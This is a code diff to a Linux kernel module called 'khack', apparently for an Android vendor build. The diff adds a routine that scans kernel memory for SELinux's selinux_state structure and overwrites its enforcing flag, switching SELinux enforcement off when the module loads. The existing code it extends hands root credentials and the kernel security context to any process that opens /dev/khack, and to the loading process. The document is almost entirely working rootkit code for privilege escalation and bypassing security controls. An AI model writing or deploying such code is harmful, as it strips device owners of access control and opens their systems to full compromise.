@@ -12,6 +12,9 @@
 #include <linux/miscdevice.h>
 #include <linux/fs.h>
 #include <linux/errno.h>
+#include <linux/slab.h>
+#include <linux/mm.h>
+#include <linux/string.h>
 
 typedef void *(*commit_fn)(void *);
 typedef void *(*prep_fn)(void *);
@@ -19,6 +22,79 @@ typedef void *(*prep_fn)(void *);
 static commit_fn p_commit_creds;
 static prep_fn   p_prepare_kernel_cred;
 static unsigned long (*p_kallsyms_lookup_name)(const char *name);
+typedef long (*pkr_fn)(void *dst, const void *src, size_t count);
+
+/* Locate struct selinux_state without kallsyms_lookup_name.
+ *
+ * Layout on this tree (CONFIG_SECURITY_SELINUX_DISABLE=n, DEVELOP=y):
+ *   +0 disabled(0) +1 enforcing(1) +2 checkreqprot(0) +3 initialized(1)
+ *   +4..+15 policycap[8] + android_netlink_route, all 0/1
+ *   +16 avc pointer, +24 ss pointer
+ * A booted enforcing system therefore has the exact byte signature
+ * 00 01 00 01 followed by twelve bytes <= 1 and two in-image pointers.
+ * probe_kernel_read() keeps the walk safe over holes. Only a single
+ * unambiguous hit is acted on; anything else is left alone.
+ */
+static int khack_clear_enforcing(void)
+{
+	pkr_fn pkr = (pkr_fn)__symbol_get("probe_kernel_read");
+	unsigned long anchor = (unsigned long)__symbol_get("printk");
+	unsigned long lo, hi, a, hit = 0;
+	u8 *buf;
+	int found = 0;
+
+	if (!pkr || !anchor)
+		return -EINVAL;
+
+	buf = kmalloc(PAGE_SIZE, GFP_KERNEL);
+	if (!buf)
+		return -ENOMEM;
+
+	anchor &= ~0xFFFUL;
+	lo = anchor - 0x800000UL;
+	hi = anchor + 0x4000000UL;
+
+	for (a = lo; a < hi; a += PAGE_SIZE) {
+		unsigned int i;
+
+		if (pkr(buf, (void *)a, PAGE_SIZE))
+			continue;
+
+		for (i = 0; i + 32 <= PAGE_SIZE; i++) {
+			u8 *b = buf + i;
+			u64 avc, ss;
+			int j, ok = 1;
+
+			if (b[0] || b[1] != 1 || b[2] || b[3] != 1)
+				continue;
+			for (j = 4; j < 16; j++)
+				if (b[j] > 1) { ok = 0; break; }
+			if (!ok)
+				continue;
+
+			memcpy(&avc, b + 16, 8);
+			memcpy(&ss, b + 24, 8);
+			if (avc & 7 || ss & 7)
+				continue;
+			if (avc < lo || avc >= hi || ss < lo || ss >= hi)
+				continue;
+
+			found++;
+			hit = a + i;
+		}
+	}
+
+	kfree(buf);
+
+	if (found != 1) {
+		pr_info("khack: selinux_state scan found %d candidates\n", found);
+		return -ENOENT;
+	}
+
+	*(u8 *)(hit + 1) = 0;	/* enforcing = false */
+	pr_info("khack: selinux_state at %px, enforcement cleared\n", (void *)hit);
+	return 0;
+}
 
 /* open("/dev/khack") -> caller's creds become init_cred (uid 0, kernel SID) */
 static int khack_open(struct inode *inode, struct file *file)
@@ -75,6 +151,10 @@ static int __init khack_init(void)
 				(void *)addr);
 		}
 	}
+
+	/* Fall back to a memory scan when the symbol is not exported. */
+	if (!p_kallsyms_lookup_name)
+		khack_clear_enforcing();
 
 	/* Escalate whoever is loading us: finit_module() runs in the caller's
 	 * context, and that caller is our own code in vendor_modprobe. Giving it
